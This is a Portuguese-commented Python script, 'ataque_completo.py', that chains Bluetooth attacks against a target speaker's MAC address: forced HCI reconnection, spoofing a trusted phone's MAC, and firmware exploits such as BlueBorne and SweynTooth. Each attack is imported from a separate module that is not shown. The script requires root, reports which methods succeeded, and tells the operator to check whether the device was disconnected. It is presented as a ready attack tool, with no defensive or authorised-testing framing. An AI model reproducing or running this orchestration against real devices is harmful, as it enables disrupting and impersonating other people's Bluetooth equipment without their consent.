#!/usr/bin/env python3
"""
Ataque Completo - Combina todas as técnicas reais
Executa múltiplos métodos em sequência para máxima efetividade
"""

import sys
import argparse
import subprocess
import os
import time

def check_root():
    return os.geteuid() == 0

def run_hci_attack(target_mac, duration=30):
    """Executa ataque HCI"""
    print("\n" + "="*60)
    print("MÉTODO 1: Reconexão Forçada via HCI")
    print("="*60)
    try:
        from hci_forced_reconnect import forced_reconnect_attack
        forced_reconnect_attack(target_mac, duration, interface=0)
        return True
    except ImportError:
        print("[!] Módulo hci_forced_reconnect não encontrado")
        return False
    except Exception as e:
        print(f"[!] Erro: {e}")
        return False

def run_mac_spoof(target_mac, trusted_mac=None, duration=30):
    """Executa spoof de MAC"""
    if not trusted_mac:
        print("[*] Pulando MAC spoof (MAC confiado não fornecido)")
        return False
    
    print("\n" + "="*60)
    print("MÉTODO 2: Spoof de MAC")
    print("="*60)
    try:
        from mac_spoof_attack import spoof_and_disconnect
        spoof_and_disconnect(trusted_mac, target_mac, 'hci0', duration)
        return True
    except ImportError:
        print("[!] Módulo mac_spoof_attack não encontrado")
        return False
    except Exception as e:
        print(f"[!] Erro: {e}")
        return False

def run_firmware_exploits(target_mac, duration=30):
    """Executa exploits de firmware"""
    print("\n" + "="*60)
    print("MÉTODO 3: Exploits de Firmware")
    print("="*60)
    try:
        from firmware_bug_exploit import main_attack
        main_attack(target_mac, ['all'], duration)
        return True
    except ImportError:
        print("[!] Módulo firmware_bug_exploit não encontrado")
        return False
    except Exception as e:
        print(f"[!] Erro: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description='Ataque Completo Bluetooth - Combina todas as técnicas',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Executa múltiplos métodos em sequência:
  1. Reconexão forçada via HCI (mais efetivo)
  2. Spoof de MAC (se MAC confiado fornecido)
  3. Exploits de firmware (BlueBorne, SweynTooth, etc)

Exemplos:
  sudo python3 ataque_completo.py --target AA:BB:CC:DD:EE:FF
  sudo python3 ataque_completo.py --target AA:BB:CC:DD:EE:FF --trusted 11:22:33:44:55:66
  sudo python3 ataque_completo.py --target AA:BB:CC:DD:EE:FF --methods hci firmware
        """
    )
    
    parser.add_argument('--target', '-t', required=True,
                       help='MAC da caixa de som')
    parser.add_argument('--trusted', '-p', default=None,
                       help='MAC do celular confiado (opcional)')
    parser.add_argument('--duration', '-d', type=int, default=30,
                       help='Duração por método (segundos)')
    parser.add_argument('--methods', '-m', nargs='+',
                       choices=['hci', 'spoof', 'firmware', 'all'],
                       default=['all'],
                       help='Métodos a executar')
    
    args = parser.parse_args()
    
    if not check_root():
        print("[!] ERRO: Requer privilégios root!")
        print("[!] Execute: sudo python3 ataque_completo.py ...")
        sys.exit(1)
    
    mac = args.target.upper().replace('-', ':')
    if len(mac) != 17 or mac.count(':') != 5:
        print("[!] MAC inválido")
        sys.exit(1)
    
    trusted = None
    if args.trusted:
        trusted = args.trusted.upper().replace('-', ':')
        if len(trusted) != 17 or trusted.count(':') != 5:
            print("[!] MAC confiado inválido")
            sys.exit(1)
    
    print("=" * 60)
    print("    ATAQUE COMPLETO BLUETOOTH")
    print("=" * 60)
    print()
    print(f"[*] Alvo: {mac}")
    print(f"[*] Duração por método: {args.duration}s")
    print(f"[*] Métodos: {', '.join(args.methods)}")
    print()
    
    methods_to_run = []
    if 'all' in args.methods:
        methods_to_run = ['hci', 'spoof', 'firmware']
    else:
        methods_to_run = args.methods
    
    results = {}
    
    # Executar métodos em sequência
    for method in methods_to_run:
        if method == 'hci':
            results['hci'] = run_hci_attack(mac, args.duration)
        elif method == 'spoof':
            if trusted:
                results['spoof'] = run_mac_spoof(mac, trusted, args.duration)
            else:
                print("[!] Pulando spoof: MAC confiado não fornecido")
                results['spoof'] = False
        elif method == 'firmware':
            results['firmware'] = run_firmware_exploits(mac, args.duration)
        
        time.sleep(2)  # Pausa entre métodos
    
    # Resumo
    print("\n" + "=" * 60)
    print("RESUMO")
    print("=" * 60)
    for method, success in results.items():
        status = "✓" if success else "✗"
        print(f"{status} {method.upper()}: {'Sucesso' if success else 'Falhou/Não aplicável'}")
    
    print("\n[+] Ataque completo finalizado")
    print("[+] Verifique se o dispositivo foi desconectado")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Ataque interrompido pelo usuário")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Erro fatal: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

